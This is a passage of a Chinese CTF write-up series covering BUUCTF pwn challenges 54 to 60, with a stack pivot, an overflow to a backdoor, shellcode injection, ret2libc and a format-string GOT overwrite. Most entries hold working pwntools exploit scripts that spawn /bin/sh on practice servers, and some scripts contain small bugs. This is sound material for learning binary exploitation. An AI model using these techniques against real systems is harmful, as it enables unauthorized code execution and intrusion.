+<p>所以只需要nc之后输入<code>exec 1&gt;&amp;0</code>就可以了</p>
+<h2 id="54-ciscn_2019_s_4">54 ciscn_2019_s_4</h2>
+<h1 id="_6">栈迁移</h1>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">LibcSearcher</span><span class="w"> </span><span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">ctypes</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s1">&#39;wt.exe -d . wsl.exe -d Ubuntu&#39;</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./pwn&quot;</span><span class="p">)</span>
+<span class="c1">#libc = ELF(&quot;./libc.so.6&quot;)</span>
+<span class="c1">#p = process(&#39;./pwn&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">26010</span><span class="p">)</span>
+<span class="c1">#gdb.attach(p)</span>
+
+<span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x08048562</span>
+<span class="n">sys</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x24</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x4</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;name?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
+
+<span class="n">leak_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>  <span class="c1">#   ebp的地址泄露出来</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;leak_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">))</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="n">leak_addr</span><span class="o">-</span><span class="mh">0x38</span>    <span class="c1"># 回到栈顶</span>
+
+<span class="n">payload2</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf</span><span class="o">+</span><span class="mh">0xc</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>  <span class="c1"># </span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="n">payload2</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h3 id="_7">动态调试分析</h3>
+<ul>
+<li>先看下新栈的地址为什么是<code>ebp-0x38</code></li>
+<li><img alt="image-20250210000514934-1751369336357-4-1751369475498-16.png" src="../../../images/image-20250210000514934-1751369336357-4-1751369475498-16.png" /></li>
+<li>
+<p>这里是寄存器的地址，可以看到我们的字符串输入到了<code>760</code>处、而<code>ebp</code>指向了<code>798</code>处，相差<code>0x3</code>8字节，所以将栈迁移到这里，方便执行我们的输入</p>
+</li>
+<li>
+<p><code>payload2 = (p32(sys)+p32(0)+p32(buf+0xc)+b'/bin/sh\x00').ljust(0x28,b'a')+p32(buf-4)+p32(leave_ret)</code></p>
+</li>
+<li>
+<p><code>p32(buf-4)</code>:将ebp覆盖为了<code>buf-4</code>,因为每执行一条指令之后eip会自动+4，这里将eip退回去，防止跳过指令</p>
+</li>
+<li>
+<p><code>p32(leave_ret)</code>：将返回地址覆盖为leave</p>
+<blockquote>
+<p>此时的栈结构</p>
+<table>
+<thead>
+<tr>
+<th>buf</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>sys_addr</td>
+<td>system函数地址</td>
+</tr>
+<tr>
+<td>0</td>
+<td>返回地址（占位）</td>
+</tr>
+<tr>
+<td>buf+12</td>
+<td>/bin/sh的参数地址</td>
+</tr>
+<tr>
+<td>/bin/sh</td>
+<td></td>
+</tr>
+<tr>
+<td>填充的剩余空间</td>
+<td></td>
+</tr>
+<tr>
+<td>buf-4</td>
+<td>栈迁移后的ebp</td>
+</tr>
+<tr>
+<td>leave</td>
+<td>执行leave_ret</td>
+</tr>
+</tbody>
+</table>
+</blockquote>
+</li>
+</ul>
+<h2 id="55-zjctf-2019login">55 [ZJCTF 2019]Login</h2>
+<p>栈追踪？或许叭</p>
+<p>函数是用c++写的，看起来有点令人头大</p>
+<div class="highlight"><pre><span></span><code>❯<span class="w"> </span>checksec<span class="w"> </span>pwn
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span><span class="s1">&#39;/home/pwn/pwn/buuctf/55/pwn&#39;</span>
+<span class="w">    </span>Arch:<span class="w">       </span>amd64-64-little
+<span class="w">    </span>RELRO:<span class="w">      </span>Partial<span class="w"> </span>RELRO
+<span class="w">    </span>Stack:<span class="w">      </span>Canary<span class="w"> </span>found
+<span class="w">    </span>NX:<span class="w">         </span>NX<span class="w"> </span>enabled
+<span class="w">    </span>PIE:<span class="w">        </span>No<span class="w"> </span>PIE<span class="w"> </span><span class="o">(</span>0x400000<span class="o">)</span>
+<span class="w">    </span>Stripped:<span class="w">   </span>No
+</code></pre></div>
+<p>ida查看</p>
+<p><img alt="image-20250216001902396-1751369336357-2-1751369475498-17.png" src="../../../images/image-20250216001902396-1751369336357-2-1751369475498-17.png" /></p>
+<p>在第14和16行发现要输入的账号和密码，不过肯定没有这么简单，执行看看</p>
+<div class="highlight"><pre><span></span><code>❯<span class="w"> </span>./pwn
+<span class="w"> </span>_____<span class="w">   </span>_<span class="w">  </span>____<span class="w"> </span>_____<span class="w"> </span>_____<span class="w">   </span>_<span class="w">                </span>_
+<span class="p">|</span>__<span class="w">  </span>/<span class="w">  </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>/<span class="w"> </span>___<span class="p">|</span>_<span class="w">   </span>_<span class="p">|</span><span class="w">  </span>___<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">    </span>___<span class="w">   </span>__<span class="w"> </span>_<span class="o">(</span>_<span class="o">)</span>_<span class="w"> </span>__
+<span class="w">  </span>/<span class="w"> </span>/_<span class="w">  </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="w">    </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">   </span>/<span class="w"> </span>_<span class="w"> </span><span class="se">\ </span>/<span class="w"> </span>_<span class="sb">`</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="err">&#39;</span>_<span class="w"> </span><span class="se">\</span>
+<span class="w"> </span>/<span class="w"> </span>/<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>___<span class="w">  </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">  </span>_<span class="p">|</span><span class="w">   </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>__<span class="p">|</span><span class="w"> </span><span class="o">(</span>_<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="o">(</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>
+/____<span class="se">\_</span>__/<span class="w"> </span><span class="se">\_</span>___<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="w">     </span><span class="p">|</span>_____<span class="se">\_</span>__/<span class="w"> </span><span class="se">\_</span>_,<span class="w"> </span><span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span>
+<span class="w">                                          </span><span class="p">|</span>___/
+Please<span class="w"> </span>enter<span class="w"> </span>username:<span class="w"> </span>admin
+Please<span class="w"> </span>enter<span class="w"> </span>password:<span class="w"> </span>2jctf_pa5sw0rd
+Password<span class="w"> </span>accepted:<span class="w"> </span>Password<span class="w"> </span>accepted:
+
+<span class="o">[</span><span class="m">1</span><span class="o">]</span><span class="w">    </span><span class="m">4014</span><span class="w"> </span>segmentation<span class="w"> </span>fault<span class="w">  </span>./pwn
+</code></pre></div>
+<p><mark>寄</mark></p>
+<p>看别人的汇编发现在<code>password_checker</code>函数中有一个隐蔽的错误</p>
+<p><img alt="image-20250216002126070-1751369336357-6-1751369475498-18.png" src="../../../images/image-20250216002126070-1751369336357-6-1751369475498-18.png" /></p>
+<p>主可以看到在<code>0x400A54</code>位置处有一个<code>call rax</code>指令，那么我们将rax修改为后门函数的地址就可以了（默认你找到那个后门函数了）</p>
+<p><img alt="image-20250216002324164-1751369336357-3-1751369475498-20.png" src="../../../images/image-20250216002324164-1751369336357-3-1751369475498-20.png" /></p>
+<p>可以在<code>0x400A89</code>位置处发现rax的值由<code>var_18</code>确定，那么去找一下<code>var_18</code>在哪里</p>
+<p><img alt="image-20250216002503305-1751369336357-5-1751369475498-21.png" src="../../../images/image-20250216002503305-1751369336357-5-1751369475498-21.png" /></p>
+<p>有的，兄弟，有的...</p>
+<p>从<code>s</code>处（ebp-0x60)开始，到<code>var_18</code>(ebp-0x18),再除去已经输入的密码<code>2jctf_pa5sw0rd\x00</code>(0xe长度),我们需要填充的数据量为<code>0x60 - 0x18 - 0xe = 0x3a</code></p>
+<p>所以exp：</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25872</span><span class="p">)</span>
+<span class="n">backdoor</span> <span class="o">=</span> <span class="mh">0x400e88</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;: &#39;</span><span class="p">,</span><span class="s1">&#39;admin&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;: &#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;2jctf_pa5sw0rd&#39;</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x3a</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">backdoor</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="56-picoctf_2018_shellcode">56 picoctf_2018_shellcode</h2>
+<p><strong><em>ret2shellcode</em></strong></p>
+<p>题比较简单，尝试了一下盲打</p>
+<div class="highlight"><pre><span></span><code>❯<span class="w"> </span>./pwn
+Enter<span class="w"> </span>a<span class="w"> </span>string!
+aaaaaa
+aaaaaa
+Thanks!<span class="w"> </span>Executing<span class="w"> </span>now...
+<span class="o">[</span><span class="m">1</span><span class="o">]</span><span class="w">    </span><span class="m">2462</span><span class="w"> </span>segmentation<span class="w"> </span>fault<span class="w">  </span>./pwn
+</code></pre></div>
+<p>根据运行情况，猜测是输入相关字符串并当作函数执行，所以直接写入<code>shellcode</code>试试</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">28483</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">()))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>然后打通了</p>
+<h2 id="57-hitcontraining_magicheap">57 hitcontraining_magicheap</h2>
+<p>施工中</p>
+<h2 id="58-jarviso_level1">58 jarviso_level1</h2>
+<p>本身应该挺简单的，但是远程和本地的输出不一样</p>
+<p>本地：</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+<span class="n">buf_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x87</span><span class="o">+</span><span class="mh">0x4</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>接受buf的地址，然后<code>ret</code>回<code>buf</code>处执行<code>shellcode</code></p>
+<p>但是远程要先输入再回显，所以只能<code>ret2libc</code></p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">LibcSearcher</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29446</span><span class="p">)</span>
+<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./pwn&quot;</span><span class="p">)</span>
+<span class="n">main_addr</span><span class="o">=</span><span class="mh">0x80484b7</span>
+<span class="n">write_plt</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+<span class="n">write_got</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x4</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">write_addr</span><span class="o">=</span><span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+
+<span class="n">libc</span><span class="o">=</span><span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">,</span><span class="n">write_addr</span><span class="p">)</span>
+<span class="n">libc_base</span><span class="o">=</span><span class="n">write_addr</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">)</span>
+
+<span class="n">system_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+<span class="n">bin_sh</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="59-axb-2019-fmt32">59 axb 2019 fmt32</h2>
+<p><strong><em>fmt+ret2libc</em></strong></p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">LibcSearcher</span><span class="w"> </span><span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">ctypes</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s1">&#39;wt.exe -d . wsl.exe -d Ubuntu&#39;</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./pwn&quot;</span><span class="p">)</span>
+<span class="c1">#libc = ELF(&quot;./libc.so.6&quot;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+<span class="c1">#gdb.attach(p)</span>
+
+<span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
+<span class="n">printf_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;%8$s&#39;</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;me:&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="p">)</span>
+<span class="n">printf_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;prinf_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">printf_addr</span><span class="p">))</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;printf&#39;</span><span class="p">,</span><span class="n">printf_addr</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">printf_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;printf&#39;</span><span class="p">)</span>
+<span class="n">sys</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+<span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
+
+<span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">8</span><span class="p">,{</span><span class="n">printf_got</span><span class="p">:</span><span class="n">system</span><span class="p">},</span><span class="n">wirte_size</span> <span class="o">=</span> <span class="s1">&#39;byte&#39;</span><span class="p">,</span><span class="n">numbwritten</span> <span class="o">=</span> <span class="mh">0xa</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h3 id="_8">分析</h3>
+<div class="highlight"><pre><span></span><code>❯<span class="w"> </span>checksec<span class="w"> </span>pwn
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span><span class="s1">&#39;/home/pwn/pwn/buuctf/59/pwn&#39;</span>
+<span class="w">    </span>Arch:<span class="w">       </span>i386-32-little
+<span class="w">    </span>RELRO:<span class="w">      </span>Partial<span class="w"> </span>RELRO
+<span class="w">    </span>Stack:<span class="w">      </span>No<span class="w"> </span>canary<span class="w"> </span>found
+<span class="w">    </span>NX:<span class="w">         </span>NX<span class="w"> </span>enabled
+<span class="w">    </span>PIE:<span class="w">        </span>No<span class="w"> </span>PIE<span class="w"> </span><span class="o">(</span>0x8048000<span class="o">)</span>
+<span class="w">    </span>Stripped:<span class="w">   </span>No
+</code></pre></div>
+<p><img alt="image-20250216163343339-1751369336358-7-1751369475498-19.png" src="../../../images/image-20250216163343339-1751369336358-7-1751369475498-19.png" /></p>
+<p>在第25行有明显<code>fmt漏洞</code>,经过输入查询发现我们的输入偏移为8（但不完全是）</p>
+<blockquote>
+<p>gdb测试的时候发现第一个字符的输入是存放在了第7个偏移处，所以应该先填充一个字符，防止后来的地址出现问题</p>
+</blockquote>
+<p>在<code>printf_got</code>后面加一个<code>b'b'</code>为了做为<code>recvuntil()</code>的标记，泄露printf地址后就可以libc了</p>
+<h2 id="60-cinscn_s_9">60 cinscn_s_9</h2>
+<p><strong><em>shellcode</em></strong></p>
+<p><code>checksec</code>一下</p>
+<div class="highlight"><pre><span></span><code>❯<span class="w"> </span>checksec<span class="w"> </span>pwn
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span><span class="s1">&#39;/home/pwn/pwn/buuctf/60/pwn&#39;</span>
+<span class="w">    </span>Arch:<span class="w">       </span>i386-32-little
+<span class="w">    </span>RELRO:<span class="w">      </span>Partial<span class="w"> </span>RELRO
+<span class="w">    </span>Stack:<span class="w">      </span>No<span class="w"> </span>canary<span class="w"> </span>found
+<span class="w">    </span>NX:<span class="w">         </span>NX<span class="w"> </span>unknown<span class="w"> </span>-<span class="w"> </span>GNU_STACK<span class="w"> </span>missing
+<span class="w">    </span>PIE:<span class="w">        </span>No<span class="w"> </span>PIE<span class="w"> </span><span class="o">(</span>0x8048000<span class="o">)</span>
+<span class="w">    </span>Stack:<span class="w">      </span>Executable
+<span class="w">    </span>RWX:<span class="w">        </span>Has<span class="w"> </span>RWX<span class="w"> </span>segments
+<span class="w">    </span>Stripped:<span class="w">   </span>No
+<span class="w">    </span>Debuginfo:<span class="w">  </span>Yes
+</code></pre></div>
+<p>有<code>RWX</code>段,保护全关，估计<code>shellcode</code>,ida看看</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">pwn</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">s</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span><span class="w"> </span><span class="c1">// [esp+8h] [ebp-20h] BYREF</span>
+
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">Hey! ^_^&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">It&#39;s nice to meet you&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">Do you have anything to tell?&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;&gt;&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+<span class="w">  </span><span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="mi">50</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;OK bye~&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">hint</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kr">__asm</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">jmp</span><span class="w">     </span><span class="n">esp</span><span class="w"> </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>有一个<code>jmp esp</code>函数，pwn函数里存在溢出点，但总计可以读入0x32字节，不够写<code>shellcraft.sh()</code>，所以要手写</p>
+<p>这边梳理一下流程</p>
+<p><code>在栈上写入小shellcode-&gt;覆盖返回地址为jmp esp-&gt;让esp指向shellcode-&gt;主动调用esp</code></p>
+<p>exp:</p>
